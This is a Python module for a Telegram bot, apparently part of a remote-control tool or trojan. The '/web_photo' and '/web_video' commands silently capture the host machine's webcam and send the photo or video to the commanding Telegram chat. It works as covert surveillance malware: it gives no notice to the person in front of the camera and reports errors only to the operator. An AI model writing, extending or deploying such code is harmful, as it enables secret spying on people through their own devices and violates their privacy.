from start_bot import dp, logger, bot
from aiogram.filters import Command
from aiogram.types import Message, FSInputFile, BufferedInputFile
from aiogram.enums import ChatAction
import pyautogui
import cv2
import io
from datetime import datetime



@dp.message(Command("web_photo"))
async def web_photo(message: Message):
	try:
		try:
			await bot.send_message(message.chat.id, "Спроба зробити знімок")
			cap = cv2.VideoCapture(0)
			ret, img = cap.read()
			cap.release()
			is_success, buffer = cv2.imencode(".png", img)
			await bot.send_chat_action(message.chat.id, ChatAction.UPLOAD_PHOTO)
			await bot.send_photo(message.chat.id, BufferedInputFile(io.BytesIO(buffer).getvalue(), filename="web.png"))
		except Exception as e:
			await bot.send_message(message.chat.id, "Помилка знімку")
			await bot.send_message(message.chat.id, str(e))
	except:
		pass
				


@dp.message(Command("web_video"))
async def web_video(message: Message):
	try:
		try:
			seconds = int(message.text.replace("/web_video ", ""))
			cap = cv2.VideoCapture(0)
			fourcc = cv2.VideoWriter_fourcc(*'XVID')
			out = cv2.VideoWriter("bWifey/temp/cam_record.avi", fourcc, 15, (640, 480))
			current_time = datetime.now()

			while((datetime.now() - current_time).seconds <= seconds / 2): 
				ret, frame = cap.read()  
				out.write(frame)

			out.release()
			await bot.send_chat_action(message.chat.id, ChatAction.UPLOAD_VIDEO)
			await bot.send_video(message.chat.id ,FSInputFile("bWifey/temp/cam_record.avi", filename="cam_record.avi"))
		except Exception as e:
			await bot.send_message(message.chat.id, "Помилка запису")
			await bot.send_message(message.chat.id, str(e))		
	except:
		pass		
